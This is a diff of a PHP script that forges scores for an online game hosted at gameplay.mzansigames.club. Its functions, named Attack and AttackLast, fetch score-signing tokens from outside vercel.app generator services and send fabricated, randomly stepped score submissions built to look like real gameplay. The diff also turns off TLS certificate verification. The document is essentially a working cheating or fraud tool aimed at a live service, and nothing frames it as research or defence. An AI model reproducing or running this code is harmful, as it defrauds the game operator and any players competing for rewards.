@@ -234,7 +234,7 @@ function X_timeout($header){
         return $trimmed_value;
 }
 
-function Attack($url,$score,$power,$memory,$increment,$uA,$arrayy){
+function Attack($url,$score,$power,$memory,$increment,$uA){
             
             $query_str = parse_url($url, PHP_URL_QUERY);
             parse_str($query_str, $query_params);
@@ -243,21 +243,30 @@ function Attack($url,$score,$power,$memory,$increment,$uA,$arrayy){
             $sigv1 = isset($query_params['sigv1']) ? $query_params['sigv1'] : '';
            $xavi = "https://x-chavi-generator.vercel.app/token/{$unique_id}/{$game_id}/{$score}";
 
+$ch = curl_init($xavi);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable verification temporarily
 
-            
-            $array2 = array_map('intval', explode(',', $arrayy));
+$content = curl_exec($ch);
+
+if (curl_errno($ch)) {
+    echo 'Error: ' . curl_error($ch);
+} else {
+    echo $content; // Display or process the content as needed
+}
+
+curl_close($ch);
+
             $data = [
                 'unique_id' => $unique_id,
                 'game_id' => $game_id,
-                'score' => $score,
-                'scoreArray' => $array2
+                'score' => $score
             ];
             $jsonData = json_encode($data);
             
-             $content = GetXavi($unique_id,$game_id,$score,$array2);
-             $content = trim($content, '"');
              
-            echo "<br><hr>Xavi: $content\nArray: ".json_encode($array2)." b4 $jsonData";
+             
+            //echo "<br><hr>Xavi: $content\nArray: ".json_encode($array2)." b4 $jsonData";
 
                 $ch = curl_init();
                 curl_setopt($ch, CURLOPT_URL, 'https://gameplay.mzansigames.club/aakado-mokalavo/'.$game_id.'/'.$unique_id.'');
@@ -308,14 +317,14 @@ function Attack($url,$score,$power,$memory,$increment,$uA,$arrayy){
                 $x_power = X_Power($header);
                 $X_timeout = X_timeout($header);
                 
-                echo "<br><hr>Timeout: $X_timeout";
+                //echo "<br><hr>Timeout: $X_timeout";
                 sleep($X_timeout);
                 // sleep(10);
                 return $x_power;
 }
         function GetXavi($unique_id,$game_id,$score,$array){
              $arrayJson = json_encode($array);
-            $url = "https://xavipower.vercel.app/token/$unique_id/$game_id/$score";
+            $url = "https://xaviold.vercel.app/token/$unique_id/$game_id/$score";
             $ch = curl_init($url . '/' . urlencode($arrayJson));
 
         // Set the options for the cURL session
@@ -332,69 +341,88 @@ function Attack($url,$score,$power,$memory,$increment,$uA,$arrayy){
 
 
 function generateRandomDivisionData($number,$url,$power,$memory,$increment,$uA) {
- 
+ $min = 72;
+ $max = 300;
     
-       $random_subtract = 310;
-    $numberBefore = $number;
-if (($number - $random_subtract) > 0) {
-    $resultFirst = $number - $random_subtract;
-    $lastNumber = $resultFirst - rand(0, 500); 
-    
-    if ($lastNumber < 0) {
-        $lastNumber = 0; // Prevent negative numbers
+   $data = [];
+    // Generate a random number between 200 and 600
+    $randomValue = rand($min, $max);
+
+    // Check if the number can be reduced to zero in one step
+    if ($number <= $randomValue) {
+       // return "0";
     }
-    
 
-    
-    
-    $arrayData = "$number,$resultFirst";
-    $arrayData = array_map('intval', explode(',', $arrayData));
-     
-} else {
-    // echo "<br>Error!";return;
-}
+    // Start with 0 as the first element
+    $data[] = [[0]];
 
-
-    
-
-
-            
-   
-    
-    
-            for ($i=0;$i<2;$i++){
-            
-        if($i==0){
-            
-                $test = $resultFirst;
-                $number = $resultFirst;
-                
-            }else{
-                
-                $test = "$numberBefore,$resultFirst";
-                $number = $numberBefore;
-                
-            }
-    
-    
-            $powerBefore = $power;
-            $memory = validate_request($power,$number);
-            $increment = 1;
-             
-           $power = Attack($url,$number,$power,$memory,$increment,$uA,$test);
+    $currentValue = $number;
+    $decide = 0;
+    // Continue subtracting until the number is zero
+    while ($currentValue > 0) {
+        // Generate a random number between 200 and 600
+    $randomValue = rand($min, $max);
+         
+        
+        // Decrease the number by the random value, but don't go below 0
+        $currentValue -= $randomValue;
+        //echo "\n<br> $randomValue $currentValue";
+        // Ensure the number does not drop below 0
+        if ($currentValue < 0) {
+            $currentValue = 0;
         }
-           
 
+        // Add the current value to the data array only if it’s greater than zero
+        if ($currentValue > 0) {
+            $data[] = [[$currentValue]];
+            
+        }
+    }
+
+    // Ensure that the last value is not zero if it was added already
+    if (end($data)[0][0] == 0) {
+        array_pop($data);
+    }
+
+    // Format the result into the JSON structure
+    $result = [
+        "c2array" => true,
+        "size" => [count($data), 1, 1],
+        "data" => $data
+    ];
+    $data = array_filter($data, function($value) {
+    return $value[0][0] != 0;
+});
+
+// Sort the data in ascending order
+usort($data, function($a, $b) {
+    return $a[0][0] - $b[0][0];
+});
+
+
+foreach ($data as $value) {
+            
+            $skore =  $value[0][0];
+            //echo "\nSent $skore"; 
+            $powerBefore = $power;
+            $memory = validate_request($power,$skore);
+            $increment = 1;
+        
+           $power = Attack($url,$skore,$power,$memory,$increment,$uA);
+           
+}
+    $flash = json_encode($result);
     $query_str = parse_url($url, PHP_URL_QUERY);
     parse_str($query_str, $query_params);
     $unique_id = isset($query_params['unique_id']) ? $query_params['unique_id'] : '';
     $game_id = isset($query_params['game_id']) ? $query_params['game_id'] : '';
 
-    $xavi = GetXavi($unique_id,$game_id,$number,$arrayData);
+    $xavi = GetXavi($unique_id,$game_id,$number,$result);
     $cleanXavi = trim($xavi, '"');
     echo "\n Xavi Generated => $cleanXavi";
     $memory = validate_request($power,$number);
-    AttackLast($url,$cleanXavi,$number,$power,$memory,$increment,$uA,$arrayData);
+    AttackLast($url,$cleanXavi,$number,$power,$memory,$increment,$uA,$flash);
+    return json_encode($result);
 }
 
 
